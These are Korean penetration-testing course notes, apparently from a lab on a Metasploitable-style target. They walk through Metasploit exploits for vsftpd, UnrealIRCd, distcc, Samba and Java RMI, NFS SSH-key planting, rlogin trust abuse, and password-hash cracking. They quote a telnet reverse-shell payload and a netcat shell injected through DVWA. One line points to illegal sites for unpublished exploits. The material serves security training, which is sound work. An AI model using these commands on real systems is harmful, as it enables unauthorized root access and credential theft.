+	[참고] 암호 안전성 테스트 사이트
+		https://howsecureismypassword.net
+		http://www.passwordmeter.com/
+		http://lastbit.com/pswcalc.asp 
+
+	[실습] 엑셀을 사용하여 암호의 길이를 조정하면서 표로 만들어 보기
+		http://lastbit.com/pswcalc.asp 사이트에서 정보얻기
+		5자리 문자 1개	: 1분
+		5자리 문자 2개	: 13분
+		5자리 문자 3개	: 31분
+		5자리 문자 4개	: 74분
+		5자리 문자 5개	: 5시간
+		6자리 문자 1개	: 11분
+		6자리 문자 2개	: 11시간
+		6자리 문자 3개	: 32시간분
+		6자리 문자 4개	: 4일
+		6자리 문자 5개	: 19일
+		
+5장 exploit-db 
+	www.exploit-db.com 코드는 칼리리눅스로컬에 다 내장되어있다
+		-> searchsploit 명령어
+	
+	[실습] searchsploit 명령어 사용
+		# searchsploit 
+			# searchsploit 단어 단어 단어 	이렇게 쓸수있음
+				# searchsploit windows
+				# searchsploit windows remote 
+				# searchsploit windows remote orcle
+		# searchsploit -u	업데이트
+		# searchsploit windows remote orcle	-> 파일 위치 확인가능
+		# cd /usr/share/exploitdb
+		# ls
+		# searchsploit windows remote orcle -w  -> url형식으로 보여준다 
+		# searchsploit orcle | wc -l 
+		# searchsploit orcle windows | wc -l
+		# searchsploit orcle windows local | wc -l
+		
+		www.exploit-db.com 에 필터링 부분의 단어들을 searchsploit 뒤에 쓰는게 좋다 
+			많이 사용되는 단어
+				TYPE    : dos, local, remote, webapps
+				Platform : (OS이름) , windows, linux, redhat, aix, hpux
+				App이름 : tomcat, apache, kernel
+				기술이름 : Buffer Overflow, sql injection
+	
+	[실습] 검색된 파일 직접 확인하기 
+		# cd /usr/share/exploitdb/
+		# ls 
+			files_exploits.csv는 exploit 밑에 있는 파일들의 정보를 보여주는 파일
+			files_shellcodes.csv는 shellcodes 밑에 있는 파일들의 정보를 보여주는 파일
+		# cd exploit/windows
+		# ls
+		# cd local
+		# ls 
+		# vi 16169.py
+			
+	[실습] exploit db 업데이트 
+		redhat 계열 : rpm -qf /bin.ls
+					rpm -ql coreutils
+		debian 계열 :  dpkg -S /bin/ls
+					dpkg -L coreutils
+		# apt-get -y install exploitdb 
+	
+	[실습] searchspolit.sh 스크립트 작성
+		# cd /root/bin
+		# cp /usr/share/exploitdb/files_exploits.csv files.csv
+		# cat files.csv
+			#!/bin/bash
+			#--------------------------------------
+			# 	# ./searchsploit oracle windows local
+			# 	Apache mod_session_crypto - Pad | exploits/multiple/webapps/40961.py
+			#--------------------------------------
+
+			if [ $# -eq 0 ] ; then
+				echo "Usage: $0 term1 [term2] .... [termN]"
+				echo "Example: seachsploit oracle windows local"
+				exit 1
+			fi
+			
+			FILE1=/root/bin/files.csv
+			TMP1=/tmp/tmp1
+			TMP2=/tmp/tmp2
+			
+			START=1
+			END=$#
+			SEARCH="cat $FILE1"
+			while [ $START -le $END ]
+			do
+				SEARCH="$SEARCH | grep -i $`echo $START`"
+				START=`expr $START + 1`
+			done
+			eval $SEARCH | awk -F, '{print $3}' | cut -c1-40 > $TMP1
+			eval $SEARCH | awk -F, '{print $2}' > $TMP2
+			
+			START=1
+			END=`wc -l < $TMP1`
+			while [ $START -le $END ]
+			do
+				LINE1=`sed -n "${START}p" $TMP1`
+				LINE2=`sed -n "${START}p" $TMP2`
+				echo "$LINE1 | $LINE2"
+				START=`expr $START + 1`
+			done
+				
+	[실습] 스크립트 인자처리 구문
+		#!/bin/bash
+
+		while getopts dq: options  2>/dev/null
+		do
+			case $options in 
+				d) echo "-d" ;;
+				q) echo "-q $OPTARG" ;;
+				*) echo "Usage:$0 {-d|-q filename}" >&2
+					exit 1;;
+			esac 
+		done
+	
+	[실습] searchspolit2.sh 스크립트 작성 위와 다르게 옵션까지 지정할수있게 
+		ex ) ./searchspolit2.sh -t dos -p 22 oracle windows 
+	
+		#!/bin/bash
+
+		if [ $# -eq 0 ] ; then
+			echo "Usage: $0 term1 [term2] .... [termN]"
+			echo "Example: seachsploit oracle windows local"
+			exit 1
+		fi
+		
+		FILE1=/root/bin/files.csv
+		TMP1=/tmp/tmp1
+		TMP2=/tmp/tmp2
+		TMP3=/tmp/tmp3
+		TMP4=/tmp/tmp4
+		RESULT=/tmp/tmp5
+		cat $FILE1 > $RESULT
+		
+		while getopts ":t:p:" options 
+		do
+			case $options in
+				t) awk -v optarg1=$OPTARG -F, '$6 == optarg1 {print $0}' $RESULT > $TMP3
+					/bin/mv $TMP3 $RESULT ;;
+				p) awk -v optarg2=$OPTARG -F, '$8 == optarg1 {print $0}' $RESULT > $TMP4
+					/bin/mv $TMP4 $RESULT ;;
+				\?) echo "Usage:$0 {-t dos -p 22 }" 1>&2
+					exit 1;;
+			esac
+		done
+
+6. 시스템 취약점과 모의해킹
+	
+	r command
+		암호화 통신 안해서 위험 
+		미리인증하는 형식이라 위험
+		# telnet HostB    ------>  인증(ID/PASS)				아이디비번을 통해 인증
+		# rlogin HostB	------>	/etc/hosts.equiv, ~/.rhosts	미리 인증을 할 수 있어 인증을 안해도됨 미리 인증안하면 텔넷과 같음
+	
+		/etc/hosts.equiv 는 관리자가 설정하는 파일
+		~/.rhosts 		는 개인 사용자가 설정하는 파일 
+	
+	등록하는 형식 
+		ServerName  UserName
+		
+		(예제) ~root/.rhosts 파일 내용	
+			루트사용자의 대해서만임 ~밑에 홈디렉토리에 있어서 
+				-----------------------------------
+				(예) HostA	root			호스트A의 root 가 미리 인증되어있음
+				(예) HostA	+			호스트A의 모든 사용자가 인증되어있음
+				(예) +		+ 			모든 호스트의 모든 사용자가 인증되어있음
+										해당 내용이 있으면 매우 취약한것
+		(예제) /etc/hosts.equiv 파일 내용  
+			관리자 파일에 대한것이기 때문에 모든 사용자에 대해 접속이 가능하다
+			다만 루트는 설정이 안됨 루트는 ~root/.rhosts에 해야함 
+				------------------------------------
+				(예) HostA	user01		위와같음
+				(예) HostA				이건 사용자 이름이 같을때 사용 접속이 가능
+				(예) HostA	+
+				(예) +		+
+	
+	[실습] r-service(rlogin/rsh/rcp) 취약점
+		사용시스템 : firewall, linux200, meta
+		(리눅스200)
+			# nmap -sV -p 512-514 192.168.10.0/24 
+			# yum -y install rsh 
+			# rlogin 192.168.10.134 -l root
+			# id 
+			# uname -a 
+			# ls /etc/*release* 
+			# cat /etc/lsb-release 
+			# cat ~/.rhosts 
+			# exit	
+			# nmap -p 512-514 172.16.6.245 
+			# /usr/bin/rlogin -l root 172.16.6.245 
+			# hostname 
+			# id 
+			# ls /etc/*release 
+			# cat /etc/release 
+			# cat ~/.rhosts 
+			# exit 
+	
+	[실습] NFS 전체 공유의 취약점
+		(리눅스200)
+			# nmap -p 2049 192.168.10.0/24 	nfs 열린곳 확인하기 
+			# rpcinfo -p 192.168.10.134			rpc요청할수있는곳을 다 달라
+			# showmount -e 192.168.10.134		마운트가능한곳 보기 /나옴 이건 전체가 공유된것
+			# mkdir -p /mnt/nfs					마운트 포인트 만들기
+			# mount 192.168.10.134:/ /mnt/nfs	마운트하기 
+			# cd /mnt/nfs						마운트된곳 이동 
+			# ls
+			# cat /etc/passwd
+			# touch /mnt/nfs/ost.txt				써지면 쓰기가 있으므로 readonly가 아님
+			# ssh-keygen -t rsa 	
+				> enter
+				> enter
+				> enter
+			# cd ~/.ssh
+			# ls
+			# cat id_rsa.pub >> /mnt/nfs/root/.ssh/authorized_keys 	공개키를 서버 권한에 넣음
+			# cat /mnt/nfs/root/.ssh/authorized_keys 					확인
+			# cd 
+			# umount /mnt/nfs 										마운트 해제
+			# df -h 
+			# nmap -p 22 192.168.10.134							ssh접근을위한 확인
+			# ssh root@192.168.10.134								접근하기 성공!
+			# ssh 192.168.10.134 cat /etc/exports					잘못된 설정파일 확인
+			
+	[실습] vsftpd 백도어 취약점
+		취약한 version -> 2.3.4 
+		opensource는 백도어를 넣어서 뿌릴 수 있음 따라서 제작자는 처음만들때 해쉬값을 포함해서 넣음
+		(메타)
+			root 사용자 비밀번호 soldesk1. 로 변경
+		(리눅스200)
+			# nmap -sV -p 21 192.168.10.0/24
+			# telnet 192.168.10.134 21
+				아무거나 쓰고 마지막에 :)
+				^]
+				quit
+			# telnet 192.168.10.134 6300		6300이 리슨상태로 동작됨 위에 :)에 의해 
+				id; root인걸 확인
+		(칼리)
+			# msfconsole -q 
+				search vsftpd 
+				use exploit/unix/ftp/vsftpd_234_backdoor
+				show options 
+				set RHOST 192.168.10.134 
+				exploit 
+					id
+					grep root /etc/passwd
+					grep root /etc/shadow		두개 내용 합치기
+			# vi crack.txt	에 내용 넣기
+			# vi wordlist.txt
+				administrator
+				admin
+				soldesk1.
+			# john --wordlist=wordlist.txt crack.txt
+			# john --show crack.txt
+		[패킷분석실습]
+		(칼리)
+			# wireshark &
+			# msfconsole -q 
+				use exploit/unix/ftp/vsftpd_234_backdoor 
+				set rhost 192.168.10.134 
+				exploit 
+		(와이어샤크)
+			찾아서 follow tcp stream
+		(메타)
+			$ sudo su -     ($ sudo -i -u root) 
+			# netstat -antp 
+			# netstat -antp | grep -i ESTABLISHED
+				tcp    0     0   192.168.10.134:6200    192.168.10.50:44821     ESTABLISHED  5559/sh
+			# ps -ef | grep 5559
+				root   5559   5038    0   22:05  ?     00:00:00  sh
+			# pstree 5038     (# pstree -aup 5038)
+				xinetd------sh
+			# last | head -20 		-> 정보가 안남아있음 이유는 /var/log/wtmp에 링크가 걸려있는데 이는 정상적인 연결을 통해야만 로그가 남음 우리느 :) 로해서 접속이 안남음
+			# who 					-> 여기에도 정보가 없음 /var/log/utmp
+			# w 					-> 명령을 보는데 이것도 /var/log/utmp 에 있는걸 보여줘서 안보여줌
+			# cd /var/log ; ls
+			# cat secure			-> 파일이없음
+			# cat messages			-> 로그 분석
+			# cat auth.log			-> 출력 결과 분석 
+				-> 이렇게하면 서버에 로그가 안남는데 이유는 로그를 남길려면 그 로그를 남길애가 필요함
+				vsftpd 데몬이 로그를 남겨라해서 남기는것인데 이렇게 백도어는 이상한 프로그램이라
+				로그를 쌓아두지를 않는다 
+				
+				따라서 이런 공격을 막기위해서는 아이디 뒤에 이상한 문자를 넣는걸 방어해야한다 
+				
+	[실습] UnreadlRCd 백도어 취약점
+		IRC = 채팅프로그램 메신저 통신을 할 수 있는 것
+			서버와 클라이언트로 구성	
+			서버에는 여러 채팅채널이있음
+			채팅 채널에 들어가 여러 사람들이랑 대화를 할 수 있다
+			1:1 과 1대다로도 가능
+		
+		(칼리)
+			# nmap -sV 192.168.10.134		-> 6667포트열려있음 
+			# wireshark &
+			# msfconsole -q
+				search unreal_ircd 
+				use exploit/unix/irc/unreal_ircd_3281_backdoor 
+				show options 
+				set RHOST 192.168.10.134 
+				exploit 
+			패킷을 분석
+			AB;sh -c '(sleep 3991|telnet 192.168.10.50 4444|while : ; do sh && break; done 2>&1|telnet 192.168.10.50 4444 >/dev/null 2>&1 &)'
+				이러한 문이 중요함 아주 많이 사용되는것 
+				exit
+				yes
+				edit
+				문서분석
+		
+	[실습] DVWA 취약성
+		(칼리)			
+			# firefox  http://192.168.10.134/dvwa
+				admin
+				password
+					DVWA Security 를 low 로 바꾸고 전송
+					왼쪽 Command Execution 에 127.0.0.1 누르고 submit 해보기 
+						-> 오른쪽 하단 view source 보기 
+						-> ping test 라는걸 알음 
+						-> 소스분석하면 쉘이 해석하는걸 알고
+						-> 1.1.1.1 ; hostname 하면 이름도 나옴
+						-> 1.1.1.1.1; hostname 하면 호스트만 나옴 
+						-> 해당 넣는 칸에 
+						-> 1.1.1.1.1; mkfifo /tmp/pipe; sh /tmp/pipe | nc -l -p 4444 > /tmp/pipe	-> 이건 배시쉘이라 쉘 치트시트 사용 만약 php등 다른거면 검색하면 많이 나옴
+			# nc 192.168.10.134 4444
+				하면 접속해서 제어 가능 
+	
+	[실습] DistCCd 보안 취약점 
+		Distccd (Distributed cc deamon) : 다중 cc 데몬 
+			-> 엄청 큰 코드를 컴파일 할때 서버를 여러대 두어 여러대의 서버가 컴파일해서 리턴해줘서 합친다 
+			cc - complier (상용)
+			gcc - GNU cc (무료)
+			
+			실습
+				(칼리)
+					# nmap -p 3632 192.168.10.134 
+					# msfconsole -q 
+						search distcc 
+						use exploit/unix/misc/distcc_exec
+						show options 
+						set RHOST 192.168.10.134 
+						exploit  
+							id
+							-> daemon 사용자는 root 사용자는 아니기 때문에 권한 상승이 별도로 필요할 것이다.
+					# netstat -antp | grep ESTABLISHED	pid번호 찾기 
+					# ps -ef | grep 4103	pid번호
+					# pstree 3441			ppid 번호
+				(메타)
+					$ netstat -antp | grep ESTABLISHED
+					$ netstat -antp | grep :4444
+	
+	[실습] Samba Arbitrary Command Execution(CVE 2007-2447)
+		취약점을 찾아서 공격하고
+		POST코드로 제어할수있는 스크립트를 이용해 연결하는 방법을 수행 
+		관리자의 잘못된설정 -> username map script 옵션 활성화
+		samba 3.0.0 -> 3.0.25rc3 	까지 원격 공격이 가능하다 
+		인증된 원격 사용자가 원격프린터 및 파일공유 관리에 관련한 MS-RPC 기능을 이용해 명령 실행 가능 
+		원인은 smb.conf에 정의된 외부 스크립트를 호출할 때 MS-RPC 호출을 통해 제공되는 필터링되지 않은 사용자 입력을 쉘에 전달
+
+		(칼리)
+			# nmap -sV 192.168.10.134
+			# msfconsole -q 
+				search samba 
+				use exploit/multi/samba/usermap_script
+				show options 
+				set RHOST 192.168.10.134 
+				show payloads 
+				set PAYLOAD cmd/unix/reverse 
+				set LHOST 192.168.10.50 
+				exploit 
+					id
+		(메타)
+			$ sudo su -      
+			# alias grep='grep --color' 
+			# netstat -anp | head -2 ; netstat -anp | grep :4444 
+			# ps -ef | grep 5721 | grep -v grep 
+			# ps -ef | grep 5718 | grep -v grep 
+			# ps -ef | grep 4444 | grep -v grep 		-> telnet 이 떠있어서 telnet으로 세션을 이루는 프로그램으로 판단 
+		(칼리)
+			# msfconsole -q 
+				use exploit/multi/samba/usermap_script 
+				set RHOST 192.168.10.134 
+				exploit 
+				<ctrl +z>
+					y
+				sessions -l
+				use post/linux/gather/hashdump 
+				show options 
+				set SESSION 1 		
+				exploit		-> 경로가 하나 표시됨 
+				exit -y
+			# john /root/.msf4/loot/20191218125700_default_192.168.10.134_linux.hashes_191611.txt
+			# john --show /root/.msf4/loot/20191218125700_default_192.168.10.134_linux.hashes_191611.txt
+			# cd /root/.msf4/loot
+			# ls -l
+	
+	[실습] Samba 공유 설정 중 wide links 옵션 취약점 
+		wide links -> 삼바서버에서 공유가 설정이되면 링크 옵션이 기본적으로 on 되는데 링크를 와이드 링크라 함
+		(칼리)
+			# nmap -p 137-139,445 -sV 192.168.10.134
+			# smbclient -L 192.168.10.134 -N
+			# msfconsole -q
+				search samba_symlink
+				use auxiliary/admin/smb/samba_symlink_traversal
+				show options
+				set RHOST 192.168.10.134
+				set SMBSHARE tmp
+				exploit 
+			# smbclient //192.168.10.134/tmp 
+				<enter>
+					help
+					ls
+					cd rootfs 
+					cd etc 
+					more passwd 
+	
+	[실습] JAVA RMI 취약점(CVE-2011-3556)
+		RMI 는 자바 객체 직렬화라는것 과 HTTP 2가지 프로토콜로 통신을하는것 인데 
+		각자 API를 가지고 개발을 하면 편하고 좋은데 호환이 안된다
+		아주 큰 프로젝트를 진행할때 API를 원격에서 호출해서 가져다가 사용할 수 있음 이를 자바 RMI이다 
+		이걸 사용하려면 WEB통신을 지원해야하고 
+		내용이 많아서 POST 메소드를 사용하고 
+		직렬화란 : 보낼때 순서대로 보내는것이다 
+		RMI는 자바에 기반한 원격 API를 끌어다가 쓸수있는 것을 말한다
+		(칼리)
+			# msfconsole -q 
+				help 
+				help db_nmap 
+				db_nmap -sV 192.168.10.134 
+				search java_rmi_server
+				use exploit/multi/misc/java_rmi_server 
+				show options 
+				set RHOST 192.168.10.134 
+				exploit 
+					help 
+					ifconfig 
+					getuid 
+					shell 
+					id 
+					useradd -m -s /bin/bash student 
+					grep student /etc/passwd 
+					date
+					exit 
+					exit 
+					quit 
+	
+	[실습] Ingreslock 백도어 취약점
+		ingres 는 db임 예전에 만들어진것 
+			(칼리)
+				# nmap 192.168.10.134 
+				# telnet 192.168.10.134 1524 
+				# hostname 
+				# id
+	
+6. 모듈마무리
+	정보수집 -> 취약점 수집 -> 침투단계 -> 상세분석 -> 보고서 작성 
+	정보수집   	: nmap/dnmap/NSE, google/SHODAN
+	취약점진단 	: Nessus/OpenVAS/Nexpose
+	모의해킹		: MSF/SET/Beef-xss
+	보고서 작업	: Power Point, Hangul, MS-Word
+	
+	[실습] "Cheat Sheet" 
+		구글검색 : "pentest cheat sheet" , password cheat sheet 등 여러개있는거 정리해놓는게 좋음
+			https://github.com/Kitsun3Sec/Pentest-Cheat-Sheets#dns
+			https://github.com/coreb1t/awesome-pentest-cheat-sheets
+			https://github.com/kmkz/Pentesting/blob/master/Pentest-Cheat-Sheet
+	
+		추가적인 정보를 확인
+			http://www.computersecuritystudent.com/cgi-bin/CSS/process_request_v3.pl?HID=f213c73c216e2231c8f0d65f3d93ac18&TYPE=SUB
+			https://community.rapid7.com/docs/DOC-1875 -> Metasploitable 2 Exploitability Guide
+	
+		CTF 대회 문제 풀이 
+			https://www.vulnhub.com
+			https://www.vulnhub.com/resources
+	
+	[실습] CTF 문제풀이 GIBSON_1
+		파일참조
+	
+	[실습] RAVEN 1 초중급
+	https://www.vulnhub.com/entry/raven-1,256/
+	ctf ova파일을 임폴트했을때 ip안잡히는게 있다 이럴때 오류 
+		만든곳이 vmware면 개꿀
+				virtual box 면 원래 여기서 로딩을 해야하지만 
+			네트워크 설정을 변경하려면
+			root로 되야함
+			이럴려면 cd나 grub 화면에서 복구해야함 -> 배운적이 있음 
+			
+			이렇게 하고
+			
+			3번째로 network
+				nic 가 인식이 되어있는지 확인 ifconfig -a , ip addr
+				
+	
+		
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	밀리터리 사이트 이렇게 새롭게 나온 취약점은 공개를 안함 익스플로잇 디비에 따라서 불법사이트에서 검색해야함
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
+	
